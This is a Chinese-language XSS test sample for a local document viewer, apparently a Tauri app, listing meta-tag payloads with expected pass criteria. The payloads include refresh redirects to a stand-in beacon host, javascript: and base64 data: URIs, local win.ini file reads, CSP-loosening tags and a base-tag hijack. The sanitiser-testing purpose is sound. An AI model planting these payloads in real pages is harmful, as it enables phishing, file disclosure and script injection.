# XSS 样本 09：meta refresh 与 meta 标签滥用

**攻击手法**：`<meta http-equiv="refresh">` 不需要任何脚本就能让页面自动跳转。对一个本地文档查看器来说，主窗口被导航到外部地址意味着**整个阅读上下文被替换**，用户甚至可能以为那是应用自己的界面（钓鱼）。此外 `<meta>` 还能被用来覆盖 CSP、设置 referrer 策略泄露路径信息。

**预期：脚本不执行、无外网请求。**（额外：不发生任何页面导航）

**验证方法**：打开本文件 → 停留 15 秒以上 → 阅读区仍显示本文档、`location.href` 不变 → Network 零请求 → Elements 面板中 `<meta>` 已被剥离。

---

## payload 1：立即跳转到外部地址

<meta http-equiv="refresh" content="0;url=https://xss-beacon.example.invalid/09-a.html">

## payload 2：延迟跳转（更隐蔽，用户已开始阅读才跳）

<meta http-equiv="refresh" content="10;url=https://xss-beacon.example.invalid/09-b.html">

## payload 3：跳转到 javascript 协议

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS-09-C')">

## payload 4：跳转到 data: URI

<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

## payload 5：跳转到本地文件（信息泄露 / 越权读取）

<meta http-equiv="refresh" content="0;url=file:///C:/Windows/win.ini">

<meta http-equiv="refresh" content="0;url=file:///C:/Users/">

## payload 6：大小写与空白混淆

<META HTTP-EQUIV="REFRESH" CONTENT="0; URL = https://xss-beacon.example.invalid/09-f.html">

<meta http-equiv = "refresh" content = "0;url=https://xss-beacon.example.invalid/09-g.html">

## payload 7：覆盖内容安全策略（试图放宽 CSP）

<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'">

<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">

预期：CSP 只能由 Tauri 配置下发，文档内的 `<meta>` 一律不得生效；即使消毒层漏放，浏览器也应因为已有更严格的策略而拒绝放宽（CSP 只能收紧不能放宽）。

## payload 8：referrer 策略与信息泄露

<meta name="referrer" content="unsafe-url">

<meta http-equiv="Set-Cookie" content="xss=1; path=/">

## payload 9：base 标签与 meta 组合（跨样本组合攻击）

<meta http-equiv="refresh" content="5;url=./relative-target.html">
<base href="https://xss-beacon.example.invalid/">

预期：即便相对地址跳转被允许，`<base>` 也不得生效（详见 `11-base-tag-hijack.md`）。

---

> **判定口径**：15 秒观察窗口内无任何导航、Network 零请求、`document.querySelectorAll('meta').length` 不含以上任何一条。
> **CSP 兜底**：`default-src 'self'` 应阻断向外部源的导航；`file://` 跳转应被 Tauri 的 asset 协议隔离机制拒绝。若任一 payload 生效，按 P0 处理。
